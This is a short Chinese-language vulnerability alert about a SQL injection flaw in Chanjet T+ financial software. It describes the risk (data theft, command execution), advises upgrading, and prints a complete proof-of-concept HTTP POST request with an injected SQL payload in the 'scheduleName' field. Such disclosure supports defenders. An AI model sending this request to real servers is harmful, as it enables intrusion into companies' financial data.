#  漏洞预警 | 畅捷通T+ SQL注入漏洞   
浅安  浅安安全   2024-03-13 08:00  
  
**0x00 漏洞编号**  
- # 暂无  
  
**0x01 危险等级**  
- 高危  
  
**0x02 漏洞概述**  
  
畅捷通T+是一款主要针对中小型工贸和商贸企业的财务业务一体化应用，融入了社交化、移动化、物联网、电子商务、互联网信息订阅等元素。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/7stTqD182SUILDwZiaCjMtWRej8GVJEGRaG5pxp8u8ar4nlYEmA0QuictibrSRCq237G4T3Ma9yibCerGmAj2oBaVg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**0x03 漏洞详情**  
###   
###   
  
**漏洞类型：**  
SQL注入  
  
  
**影响：**  
命令执行  
  
**简述：**  
畅捷通信息技术股份有限公司畅捷通T+存在SQL注入漏洞，攻击者可利用该漏洞获取敏感数据，甚至在高权限下，执行任意命令。  
###   
  
**0x04 影响版本**  
- 畅捷通T+  
  
**0x05****POC**  
```
POST /tplus/ajaxpro/Ufida.T.SM.UIP.ScheduleManage.ScheduleManageController,Ufida.T.SM.UIP.ashx?method=GetScheduleLogList HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 93
        
{"scheduleName":"' AND 1 IN (SELECT sys.fn_varbintohexstr(hashbytes('MD5','1'))) AND '1'='1"}
```  
  
**仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布****者**  
**不承担任何法律及连带责任。**  
  
**0x06****修复建议**  
  
**目前官方已发布漏洞修复版本，建议用户升级到安全版本****：**  
  
https://www.chanjetvip.com/product/goods/  
  
  
  
